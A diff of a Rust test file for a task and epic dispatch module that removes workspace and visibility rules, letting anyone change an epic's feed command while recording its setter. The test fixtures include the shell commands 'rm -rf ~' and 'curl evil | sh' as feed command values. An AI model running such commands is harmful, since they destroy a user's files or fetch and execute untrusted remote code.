@@ -1,23 +1,11 @@
-//! Task #98746 (V6–V9): poll claims follow sight, `feed_command` has an
-//! authority rule, the sweep that archives learnings stops at the caller's
-//! workspaces, and a managed PR Reviews root is its creator's own.
+//! Task #98746 (V8, V9) as it stands with one person using the store:
+//! `feed_command` may be changed by anyone and records its setter, the claim
+//! rules follow the setter, and a managed PR Reviews root is its creator's own
+//! (`docs/plans/2026-11-23-remove-workspaces.md`, R6, R7).
 
 use dispatch_spacetime_module as module;
 
 use super::*;
-
-const WS1: i64 = 1;
-const WS2: i64 = 2;
-
-fn member(id: i64, workspace_id: i64, user: &str, role: &str) -> module::Membership {
-    module::Membership {
-        id,
-        workspace_id,
-        user: user.into(),
-        role: role.into(),
-        ..module::blank_membership()
-    }
-}
 
 fn host(id: &str, owner: &str) -> module::Host {
     module::Host {
@@ -37,29 +25,9 @@ fn claim(id: i64, epic_id: i64, host: &str) -> module::PollOwner {
     }
 }
 
-fn task_claim(id: i64, task_id: i64, host: &str) -> module::PollOwner {
-    module::PollOwner {
-        scope: POLL_SCOPE_TASK.into(),
-        scope_id: task_id,
-        ..claim(id, 0, host)
-    }
-}
-
-fn task_in_epic(id: i64, epic_id: i64) -> module::Task {
-    module::Task {
-        id,
-        epic_id,
-        repo_path: "/repo".into(),
-        created_at: TEST_STAMP.into(),
-        updated_at: TEST_STAMP.into(),
-        ..module::blank_task()
-    }
-}
-
-fn epic(id: i64, workspace_id: i64, creator: &str) -> module::Epic {
+fn epic(id: i64, creator: &str) -> module::Epic {
     module::Epic {
         id,
-        workspace_id,
         created_by: creator.into(),
         created_at: TEST_STAMP.into(),
         updated_at: TEST_STAMP.into(),
@@ -67,37 +35,18 @@ fn epic(id: i64, workspace_id: i64, creator: &str) -> module::Epic {
     }
 }
 
-/// `me` administers workspaces 1 and 2; `bob` and `carol` belong to workspace
-/// 1 only. Epic 1 is `bob`'s, in workspace 1, with a feed command, and hosts
-/// `h-me`, `h-bob` and `h-carol` each belong to their person.
+/// Epic 1 is `bob`'s, with a feed command, and hosts `h-me`, `h-bob` and
+/// `h-carol` each belong to their person.
 fn scenario() -> MemoryReducerCaller {
     let (caller, _rows) = caller();
-    let caller = caller.with_sender("me").with_workspace_rules();
+    let caller = caller.with_sender("me").with_identity_rules();
     {
         let mut t = caller.lock();
-        for (id, name) in [(WS1, "Core"), (WS2, "Other")] {
-            t.workspaces.insert(
-                id,
-                module::Workspace {
-                    id,
-                    name: name.into(),
-                    ..module::blank_workspace()
-                },
-            );
-        }
-        for m in [
-            member(1, WS1, "me", "admin"),
-            member(2, WS1, "bob", "member"),
-            member(3, WS1, "carol", "member"),
-            member(4, WS2, "me", "admin"),
-        ] {
-            t.memberships.insert(m.id, m);
-        }
         t.epics.insert(
             1,
             module::Epic {
                 feed_command: "gh-feed".into(),
-                ..epic(1, WS1, "bob")
+                ..epic(1, "bob")
             },
         );
         for h in [
@@ -134,86 +83,7 @@ fn give_claims(caller: &MemoryReducerCaller) {
     }
 }
 
-// -- V6: claims follow sight ------------------------------------------------
-
-#[test]
-fn removing_a_member_releases_the_poll_claims_their_hosts_hold() {
-    let caller = scenario();
-    give_claims(&caller);
-    caller.apply_remove_member(2).unwrap(); // bob leaves workspace 1
-    assert_eq!(claim_hosts(&caller), ["h-me"]);
-}
-
-#[test]
-fn removing_a_member_keeps_claims_on_epics_in_their_other_workspaces() {
-    let caller = scenario();
-    {
-        let mut t = caller.lock();
-        t.epics.insert(2, epic(2, WS2, "me"));
-        t.memberships.insert(5, member(5, WS2, "bob", "member"));
-        for p in [claim(1, 1, "h-bob"), claim(2, 2, "h-bob")] {
-            t.poll_owners.insert(p.id, p);
-        }
-    }
-    caller.apply_remove_member(2).unwrap();
-    let t = caller.lock();
-    assert!(!t.poll_owners.contains_key(&1));
-    assert!(t.poll_owners.contains_key(&2));
-}
-
-#[test]
-fn moving_an_epic_releases_claims_held_for_people_who_lose_sight_of_it() {
-    let caller = scenario();
-    give_claims(&caller);
-    caller
-        .apply_move_epic_to_workspace(EpicId(1), WS2)
-        .unwrap()
-        .applied()
-        .unwrap();
-    assert_eq!(claim_hosts(&caller), ["h-me"]);
-}
-
-// -- V7: the archive sweep stops at the caller's sight ------------------------
-
-fn stale_learning(id: i64, workspace_id: i64) -> module::Learning {
-    module::Learning {
-        id,
-        kind: "pitfall".into(),
-        summary: "summary".into(),
-        detail: None,
-        scope: "user".into(),
-        scope_ref: None,
-        tags: "[]".into(),
-        status: "approved".into(),
-        source_task_id: None,
-        upvote_count: 0,
-        last_upvoted_at: None,
-        created_at: TEST_STAMP.into(),
-        updated_at: TEST_STAMP.into(),
-        embedding: None,
-        workspace_id,
-        author: "bob".into(),
-    }
-}
-
-#[test]
-fn the_archive_sweep_leaves_other_workspaces_learnings_alone() {
-    let caller = scenario().with_sender("bob"); // bob is in workspace 1 only
-    {
-        let mut t = caller.lock();
-        for l in [stale_learning(1, WS1), stale_learning(2, WS2)] {
-            t.learnings.insert(l.id, l);
-        }
-    }
-    caller
-        .apply_archive_stale_learnings(at("9999-01-01 00:00:00.000"))
-        .unwrap();
-    let t = caller.lock();
-    assert_eq!(t.learnings[&1].status, "archived");
-    assert_eq!(t.learnings[&2].status, "approved");
-}
-
-// -- V8: who may change feed_command ------------------------------------------
+// -- V8: anyone may change feed_command; the change records its setter -------
 
 async fn set_command(caller: &mut MemoryReducerCaller, who: &str) -> ReducerOutcome {
     act_as(caller, who);
@@ -229,18 +99,11 @@ async fn set_command(caller: &mut MemoryReducerCaller, who: &str) -> ReducerOutc
         .unwrap()
 }
 
+/// R7: anyone may change a command; the setter record keeps it off every other
+/// machine.
 #[tokio::test]
-async fn a_member_who_only_sees_the_epic_cannot_change_its_feed_command() {
-    let mut caller = scenario();
-    give_claims(&caller);
-    let outcome = set_command(&mut caller, "carol").await;
-    assert!(matches!(outcome, ReducerOutcome::Refused(_)), "{outcome:?}");
-    assert_eq!(caller.lock().epics[&1].feed_command, "gh-feed");
-}
-
-#[tokio::test]
-async fn the_creator_and_an_admin_may_change_it() {
-    for who in ["bob", "me"] {
+async fn anyone_may_change_it() {
+    for who in ["bob", "me", "carol"] {
         let mut caller = scenario();
         give_claims(&caller);
         let outcome = set_command(&mut caller, who).await;
@@ -249,19 +112,8 @@ async fn the_creator_and_an_admin_may_change_it() {
             "{who}: {outcome:?}"
         );
         assert_eq!(caller.lock().epics[&1].feed_command, "rm -rf ~");
+        assert_eq!(caller.lock().epics[&1].feed_command_set_by, who);
     }
-}
-
-/// Task #98851 (M2): holding the claim is not authorship. A claim is something
-/// any host can take, so the owner of the claiming host has no say over what
-/// the command is.
-#[tokio::test]
-async fn the_owner_of_the_host_holding_the_claim_may_not_change_it() {
-    let mut caller = scenario();
-    caller.lock().poll_owners.insert(1, claim(1, 1, "h-carol"));
-    let outcome = set_command(&mut caller, "carol").await;
-    assert!(matches!(outcome, ReducerOutcome::Refused(_)), "{outcome:?}");
-    assert_eq!(caller.lock().epics[&1].feed_command, "gh-feed");
 }
 
 /// A real change records its author and drops the claims of every host whose
@@ -270,7 +122,7 @@ async fn the_owner_of_the_host_holding_the_claim_may_not_change_it() {
 async fn changing_the_command_records_the_setter_and_releases_other_claims() {
     let mut caller = scenario();
     give_claims(&caller); // h-bob and h-me
-    let outcome = set_command(&mut caller, "me").await; // an admin, not the creator
+    let outcome = set_command(&mut caller, "me").await; // not the creator
     assert!(matches!(outcome, ReducerOutcome::Applied(_)), "{outcome:?}");
     assert_eq!(caller.lock().epics[&1].feed_command_set_by, "me");
     assert_eq!(claim_hosts(&caller), ["h-me"]);
@@ -303,7 +155,6 @@ async fn creating_an_epic_with_a_command_records_its_creator_as_the_setter() {
     act_as(&mut caller, "carol");
     let id = caller
         .create_epic(bindings::Epic {
-            workspace_id: WS1,
             feed_command: "curl evil | sh".into(),
             // A client's claim about who set it is ignored.
             feed_command_set_by: "bob".into(),
@@ -320,7 +171,6 @@ async fn creating_an_epic_without_a_command_records_no_setter() {
     act_as(&mut caller, "carol");
     let id = caller
         .create_epic(bindings::Epic {
-            workspace_id: WS1,
             ..blank_bindings_epic()
         })
         .await
@@ -329,7 +179,7 @@ async fn creating_an_epic_without_a_command_records_no_setter() {
 }
 
 #[tokio::test]
-async fn setting_the_command_it_already_has_needs_no_authority() {
+async fn setting_the_command_it_already_has_is_not_a_change() {
     let mut caller = scenario();
     act_as(&mut caller, "carol");
     let outcome = caller
@@ -349,7 +199,7 @@ async fn setting_the_command_it_already_has_needs_no_authority() {
 // -- V9: a managed root is its creator's own ------------------------------------
 
 #[test]
-fn each_person_provisions_a_private_managed_root_of_their_own() {
+fn each_person_provisions_a_managed_root_of_their_own() {
     let mut caller = scenario();
     for who in ["bob", "carol"] {
         act_as(&mut caller, who);
@@ -364,22 +214,20 @@ fn each_person_provisions_a_private_managed_root_of_their_own() {
         .filter(|e| e.feed_role == module::ROLE_REVIEWS_PARENT)
         .collect();
     assert_eq!(roots.len(), 2, "one root each, not one shared root");
-    assert!(roots.iter().all(|e| e.visibility == "private"));
     let mut creators: Vec<&str> = roots.iter().map(|e| e.created_by.as_str()).collect();
     creators.sort();
     assert_eq!(creators, ["bob", "carol"]);
 }
 
 #[test]
-fn a_public_root_its_creator_finds_is_made_private() {
+fn a_root_its_creator_finds_is_retargeted() {
     let mut caller = scenario();
     caller.lock().epics.insert(
         7,
         module::Epic {
             feed_role: module::ROLE_REVIEWS_PARENT.into(),
             feed_command: "old".into(),
-            visibility: "public".into(),
-            ..epic(7, WS1, "bob")
+            ..epic(7, "bob")
         },
     );
     act_as(&mut caller, "bob");
@@ -387,7 +235,6 @@ fn a_public_root_its_creator_finds_is_made_private() {
         .apply_ensure_managed_epics("reviews.sh".into(), 600, String::new(), 0)
         .unwrap();
     let t = caller.lock();
-    assert_eq!(t.epics[&7].visibility, "private");
     assert_eq!(t.epics[&7].feed_command, "reviews.sh");
     assert_eq!(
         t.epics
@@ -399,15 +246,14 @@ fn a_public_root_its_creator_finds_is_made_private() {
 }
 
 #[test]
-fn another_persons_public_root_is_not_reused_or_rewritten() {
+fn another_persons_root_is_not_reused_or_rewritten() {
     let mut caller = scenario();
     caller.lock().epics.insert(
         7,
         module::Epic {
             feed_role: module::ROLE_REVIEWS_PARENT.into(),
             feed_command: "bobs-command".into(),
-            visibility: "public".into(),
-            ..epic(7, WS1, "bob")
+            ..epic(7, "bob")
         },
     );
     act_as(&mut caller, "carol");
@@ -422,7 +268,7 @@ fn another_persons_public_root_is_not_reused_or_rewritten() {
         .any(|e| e.feed_role == module::ROLE_REVIEWS_PARENT && e.created_by == "carol"));
 }
 
-// -- M2: claiming and overriding need sight, and a feed epic its setter ----------
+// -- M2: a claim needs an existing scope, and a feed epic its setter ----------
 
 fn blank_bindings_epic() -> bindings::Epic {
     module::blank_epic().into()
@@ -451,37 +297,9 @@ async fn override_for(
         .unwrap()
 }
 
-fn make_private(caller: &MemoryReducerCaller, epic_id: i64) {
-    caller.lock().epics.get_mut(&epic_id).unwrap().visibility = "private".into();
-}
-
+/// R2: no sight check; an existing scope suffices.
 #[tokio::test]
-async fn a_claim_on_an_epic_the_caller_cannot_see_is_refused() {
-    let mut caller = scenario();
-    make_private(&caller, 1); // bob's, so carol cannot see it
-    for out in [
-        claim_for(
-            &mut caller,
-            "carol",
-            PollScopeId::Epic(EpicId(1)),
-            "h-carol",
-        )
-        .await,
-        override_for(
-            &mut caller,
-            "carol",
-            PollScopeId::Epic(EpicId(1)),
-            "h-carol",
-        )
-        .await,
-    ] {
-        assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
-    }
-    assert!(claim_hosts(&caller).is_empty());
-}
-
-#[tokio::test]
-async fn a_claim_on_a_task_the_caller_cannot_see_is_refused() {
+async fn a_claim_on_another_persons_task_is_allowed() {
     let mut caller = scenario();
     caller.lock().tasks.insert(
         1,
@@ -498,13 +316,10 @@ async fn a_claim_on_a_task_the_caller_cannot_see_is_refused() {
         "h-carol",
     )
     .await;
-    assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
-    let out = claim_for(&mut caller, "bob", PollScopeId::Task(TaskId(1)), "h-bob").await;
     assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
 }
 
-/// Carol sees bob's public feed epic but her host may not poll a command bob
-/// wrote, claimed or overridden.
+/// Carol's host may not poll a command bob wrote, claimed or overridden.
 #[tokio::test]
 async fn a_host_whose_owner_did_not_set_the_command_cannot_claim_the_feed() {
     let mut caller = scenario();
@@ -550,7 +365,7 @@ async fn a_recorded_setter_wins_over_the_creator() {
 }
 
 #[tokio::test]
-async fn an_epic_without_a_command_can_be_claimed_by_any_host_that_sees_it() {
+async fn an_epic_without_a_command_can_be_claimed_by_any_host() {
     let mut caller = scenario();
     caller.lock().epics.get_mut(&1).unwrap().feed_command = String::new();
     let out = claim_for(
@@ -563,292 +378,11 @@ async fn an_epic_without_a_command_can_be_claimed_by_any_host_that_sees_it() {
     assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
 }
 
-// -- M4: every loss-of-sight path releases the claims it strands --------------
-
-/// Carol's host holds the claim on epic 1 (bob's, in workspace 1); bob's host
-/// holds one too. A path that takes carol's sight of epic 1 away must release
-/// hers and keep bob's. The graduated check: a new loss-of-sight path adds a
-/// row here, and a path that forgets the release fails it.
-async fn carol_loses_sight_by(path: &str, caller: &mut MemoryReducerCaller) {
-    match path {
-        "remove_member" => {
-            caller.apply_remove_member(3).unwrap(); // carol leaves workspace 1
-        }
-        "move_epic_to_workspace" => {
-            caller
-                .apply_move_epic_to_workspace(EpicId(1), WS2)
-                .unwrap()
-                .applied()
-                .unwrap();
-        }
-        "set_epic_visibility" => {
-            act_as(caller, "bob");
-            caller
-                .apply_set_epic_visibility(EpicId(1), "private".into())
-                .unwrap()
-                .applied()
-                .unwrap();
-        }
-        "reparent_under_a_private_epic" => {
-            caller.lock().epics.insert(
-                2,
-                module::Epic {
-                    visibility: "private".into(),
-                    ..epic(2, WS1, "bob")
-                },
-            );
-            act_as(caller, "bob");
-            caller
-                .patch_epic(
-                    EpicId(1),
-                    bindings::EpicPatch {
-                        parent_epic_id: Some(2),
-                        ..blank_epic_patch()
-                    },
-                )
-                .await
-                .unwrap()
-                .applied()
-                .unwrap();
-        }
-        "managed_root_made_private" => {
-            {
-                let mut t = caller.lock();
-                let root = t.epics.get_mut(&1).unwrap();
-                root.feed_role = module::ROLE_REVIEWS_PARENT.into();
-                root.feed_command = "reviews.sh".into();
-                root.feed_interval_secs = 600;
-            }
-            act_as(caller, "bob");
-            caller
-                .apply_ensure_managed_epics("reviews.sh".into(), 600, String::new(), 0)
-                .unwrap();
-        }
-        other => panic!("unknown loss-of-sight path {other}"),
-    }
-}
-
-const LOSS_OF_SIGHT_PATHS: [&str; 5] = [
-    "remove_member",
-    "move_epic_to_workspace",
-    "set_epic_visibility",
-    "reparent_under_a_private_epic",
-    "managed_root_made_private",
-];
-
-#[tokio::test]
-async fn every_loss_of_sight_path_releases_the_claims_it_strands() {
-    for path in LOSS_OF_SIGHT_PATHS {
-        let mut caller = scenario();
-        {
-            let mut t = caller.lock();
-            // Bob's epic: his host and carol's both hold it (carol's by an
-            // earlier, now-refused kind of claim: a legacy row).
-            for p in [claim(1, 1, "h-bob"), claim(2, 1, "h-carol")] {
-                t.poll_owners.insert(p.id, p);
-            }
-            // M10: a task of that epic is polled by both hosts too. A task
-            // claim follows sight of the task, so it goes the same way.
-            t.tasks.insert(10, task_in_epic(10, 1));
-            for p in [task_claim(3, 10, "h-bob"), task_claim(4, 10, "h-carol")] {
-                t.poll_owners.insert(p.id, p);
-            }
-            // Bob stays a member wherever the path leaves the epic.
-            t.memberships.insert(6, member(6, WS2, "bob", "member"));
-            // B1: the marks follow the claims.
-            mark_task(&mut t, 10, &["bob", "carol"]);
-        }
-        carol_loses_sight_by(path, &mut caller).await;
-        assert_eq!(
-            marks_on(&caller, 10),
-            (vec!["bob".to_string()], vec!["bob".to_string()]),
-            "{path}: carol's marks survived, or bob's were dropped"
-        );
-        let hosts = claim_hosts(&caller);
-        assert!(
-            !hosts.contains(&"h-carol".to_string()),
-            "{path}: carol's claim survived: {hosts:?}"
-        );
-        assert_eq!(
-            hosts.iter().filter(|h| *h == "h-bob").count(),
-            2,
-            "{path}: bob's epic or task claim was released: {hosts:?}"
-        );
-    }
-}
-
-/// An unseen mark and a bookmark on `task` for each of `people`.
-fn mark_task(t: &mut Tables, task: i64, people: &[&str]) {
-    for who in people {
-        let id = module::unseen_id(who, task);
-        t.unseen_tasks.insert(
-            id.clone(),
-            module::UnseenTask {
-                id,
-                task_id: task,
-                subscriber: (*who).into(),
-            },
-        );
-        let id = module::bookmark_id(who, task);
-        t.bookmarks.insert(
-            id.clone(),
-            module::Bookmark {
-                id,
-                task_id: task,
-                subscriber: (*who).into(),
-            },
-        );
-    }
-}
-
-/// Who holds an (unseen mark, bookmark) on `task`, sorted.
-fn marks_on(caller: &MemoryReducerCaller, task: i64) -> (Vec<String>, Vec<String>) {
-    let t = caller.lock();
-    let mut unseen: Vec<String> = t
-        .unseen_tasks
-        .values()
-        .filter(|u| u.task_id == task)
-        .map(|u| u.subscriber.clone())
-        .collect();
-    let mut bookmarks: Vec<String> = t
-        .bookmarks
-        .values()
-        .filter(|b| b.task_id == task)
-        .map(|b| b.subscriber.clone())
-        .collect();
-    unseen.sort();
-    bookmarks.sort();
-    (unseen, bookmarks)
-}
-
-/// A2/B1/A8: an admin's detach ends bob's claim and marks.
-#[tokio::test]
-async fn a_detach_ends_the_claims_and_marks_it_strands() {
-    let caller = scenario();
-    {
-        let mut t = caller.lock();
-        t.tasks.insert(10, task_in_epic(10, 1));
-        t.poll_owners.insert(3, task_claim(3, 10, "h-bob"));
-        mark_task(&mut t, 10, &["bob"]);
-    }
-    caller
-        .set_task_epic(TaskId(10), None, String::new())
-        .await
-        .unwrap()
-        .applied()
-        .unwrap();
-    assert!(claim_hosts(&caller).is_empty());
-    assert_eq!(marks_on(&caller, 10), (vec![], vec![]));
-}
-
-/// A2 (decided with the user): refused while another person's host runs it.
-#[tokio::test]
-async fn a_detach_is_refused_while_another_persons_host_runs_an_agent_on_it() {
-    let caller = scenario();
-    {
-        let mut t = caller.lock();
-        t.tasks.insert(10, task_in_epic(10, 1));
-        t.poll_owners.insert(3, task_claim(3, 10, "h-bob"));
-        t.agents.insert(
-            1,
-            module::Agent {
-                id: 1,
-                task_id: 10,
-                host: "h-bob".into(),
-                state: module::AGENT_CURRENT.into(),
-                ..module::blank_agent()
-            },
-        );
-    }
-    match caller
-        .set_task_epic(TaskId(10), None, String::new())
-        .await
-        .unwrap()
-    {
-        ReducerOutcome::Refused(why) => assert!(why.contains("another person's host"), "{why}"),
-        other => panic!("expected a refusal, got {other:?}"),
-    }
-    assert_eq!(claim_hosts(&caller).len(), 1);
-}
-
-/// The sub-epics of a tree that goes private are covered too.
-#[tokio::test]
-async fn a_visibility_flip_also_releases_claims_on_the_sub_epics() {
-    let mut caller = scenario();
-    {
-        let mut t = caller.lock();
-        t.epics.insert(
-            2,
-            module::Epic {
-                parent_epic_id: 1,
-                ..epic(2, WS1, "bob")
-            },
-        );
-        t.poll_owners.insert(1, claim(1, 2, "h-carol"));
-    }
-    act_as(&mut caller, "bob");
-    caller
-        .apply_set_epic_visibility(EpicId(1), "private".into())
-        .unwrap()
-        .applied()
-        .unwrap();
-    assert!(claim_hosts(&caller).is_empty());
-}
-
-// -- Review Q7: a refresh request follows sight -------------------------------
-
-#[tokio::test]
-async fn a_refresh_request_on_an_epic_the_caller_cannot_see_is_refused() {
-    let mut caller = scenario();
-    {
-        let mut t = caller.lock();
-        // Epic 1 is bob's, in workspace 1; the poll belongs to bob's host and
-        // `h-me` is `me`'s. carol sees epic 1; a stranger outside workspace 1
-        // does not.
-        let p = claim(1, 1, "h-bob");
-        t.poll_owners.insert(p.id, p);
-        t.hosts.insert("h-eve".into(), host("h-eve", "eve"));
-    }
-    act_as(&mut caller, "eve");
-    let refused = caller
-        .request_feed_refresh(crate::models::EpicId(1), "h-eve".into())
-        .await
-        .unwrap();
-    match refused {
-        ReducerOutcome::Refused(why) => assert!(why.contains("does not exist"), "{why}"),
-        other => panic!("an unseen epic must read as absent, got {other:?}"),
-    }
-}
-
-/// `core.allium: UniqueFeedRolePerParent`: moving a managed root into a
-/// workspace where its creator already has a root with that role is refused.
-#[test]
-fn moving_a_root_onto_a_twin_of_its_role_is_refused() {
-    let caller = scenario();
-    {
-        let mut t = caller.lock();
-        for (id, ws) in [(5, WS1), (6, WS2)] {
-            t.epics.insert(
-                id,
-                module::Epic {
-                    feed_role: module::ROLE_REVIEWS_PARENT.into(),
-                    ..epic(id, ws, "bob")
-                },
-            );
-        }
-    }
-    let outcome = caller.apply_move_epic_to_workspace(EpicId(5), WS2).unwrap();
-    match outcome {
-        ReducerOutcome::Refused(why) => assert!(why.contains("already exists"), "{why}"),
-        other => panic!("expected a refusal, got {other:?}"),
-    }
-}
-
 /// `core.allium: UniqueFeedRolePerParent`: provisioning finds a role sub-epic
-/// under its own root even when someone else's private epic holds the slot,
-/// rather than inserting a second one beside it.
+/// under its own root even when someone else made it, rather than inserting a
+/// second one beside it.
 #[test]
-fn provisioning_does_not_duplicate_a_role_sub_epic_it_cannot_see() {
+fn provisioning_does_not_duplicate_a_role_sub_epic_someone_else_made() {
     let caller = scenario();
     {
         let mut t = caller.lock();
@@ -858,8 +392,7 @@ fn provisioning_does_not_duplicate_a_role_sub_epic_it_cannot_see() {
                 feed_role: module::ROLE_REVIEWS_PARENT.into(),
                 feed_command: "reviews.sh".into(),
                 feed_interval_secs: 600,
-                visibility: module::VISIBILITY_PRIVATE.into(),
-                ..epic(10, WS1, "me")
+                ..epic(10, "me")
             },
         );
         t.epics.insert(
@@ -867,8 +400,7 @@ fn provisioning_does_not_duplicate_a_role_sub_epic_it_cannot_see() {
             module::Epic {
                 parent_epic_id: 10,
                 feed_role: module::ROLE_MY_REVIEWS.into(),
-                visibility: module::VISIBILITY_PRIVATE.into(),
-                ..epic(11, WS1, "bob")
+                ..epic(11, "bob")
             },
         );
     }
@@ -892,4 +424,117 @@ fn provisioning_does_not_duplicate_a_role_sub_epic_it_cannot_see() {
         .filter(|e| e.parent_epic_id == 10 && e.feed_role == module::ROLE_MY_REVIEWS)
         .count();
     assert_eq!(my_reviews, 1);
+}
+
+// -- a move takes a task out of nobody's reach (remove-workspaces R2) --------
+
+/// The module's `a_task_move_or_detach_keeps_its_claim_and_bookmarks`: a
+/// move to another epic and a detach onto a board keep bob's claim on the
+/// task and both people's bookmarks.
+#[tokio::test]
+async fn a_task_move_or_detach_keeps_its_claim_and_bookmarks() {
+    let caller = scenario();
+    {
+        let mut t = caller.lock();
+        t.epics.insert(2, epic(2, "me"));
+        t.tasks.insert(
+            10,
+            module::Task {
+                id: 10,
+                epic_id: 1,
+                created_at: TEST_STAMP.into(),
+                updated_at: TEST_STAMP.into(),
+                ..module::blank_task()
+            },
+        );
+        t.poll_owners.insert(
+            3,
+            module::PollOwner {
+                scope: POLL_SCOPE_TASK.into(),
+                scope_id: 10,
+                ..claim(3, 0, "h-bob")
+            },
+        );
+        for who in ["me", "bob"] {
+            let id = module::bookmark_id(who, 10);
+            t.bookmarks.insert(
+                id.clone(),
+                module::Bookmark {
+                    id,
+                    task_id: 10,
+                    subscriber: who.into(),
+                },
+            );
+        }
+    }
+    let bookmarked = |caller: &MemoryReducerCaller| {
+        let mut who: Vec<String> = caller
+            .lock()
+            .bookmarks
+            .values()
+            .filter(|b| b.task_id == 10)
+            .map(|b| b.subscriber.clone())
+            .collect();
+        who.sort();
+        who
+    };
+    let everyone = vec!["bob".to_string(), "me".to_string()];
+
+    caller
+        .set_task_epic(TaskId(10), Some(EpicId(2)), String::new())
+        .await
+        .unwrap()
+        .applied()
+        .unwrap();
+    assert_eq!(claim_hosts(&caller), vec!["h-bob".to_string()], "move");
+    assert_eq!(bookmarked(&caller), everyone, "move");
+
+    caller
+        .set_task_epic(TaskId(10), None, String::new())
+        .await
+        .unwrap()
+        .applied()
+        .unwrap();
+    assert_eq!(claim_hosts(&caller), vec!["h-bob".to_string()], "detach");
+    assert_eq!(bookmarked(&caller), everyone, "detach");
+}
+
+/// `core.allium: UniqueFeedRolePerParent`: re-parenting an epic under a
+/// parent that already holds an epic with its feed role is refused, and the
+/// epic stays where it was. (The workspace move this replaced is gone; a
+/// re-parent is the one move left that can land a role on a twin.)
+#[tokio::test]
+async fn reparenting_onto_a_twin_of_its_role_is_refused() {
+    let caller = scenario();
+    {
+        let mut t = caller.lock();
+        for id in [10, 11] {
+            t.epics.insert(id, epic(id, "me"));
+        }
+        for (id, parent) in [(5, 10), (6, 11)] {
+            t.epics.insert(
+                id,
+                module::Epic {
+                    parent_epic_id: parent,
+                    feed_role: module::ROLE_MY_REVIEWS.into(),
+                    ..epic(id, "me")
+                },
+            );
+        }
+    }
+    let outcome = caller
+        .patch_epic(
+            EpicId(6),
+            bindings::EpicPatch {
+                parent_epic_id: Some(10),
+                ..blank_epic_patch()
+            },
+        )
+        .await
+        .unwrap();
+    match outcome {
+        ReducerOutcome::Refused(why) => assert!(why.contains("already exists"), "{why}"),
+        other => panic!("expected a refusal, got {other:?}"),
+    }
+    assert_eq!(caller.lock().epics[&6].parent_epic_id, 11);
 }
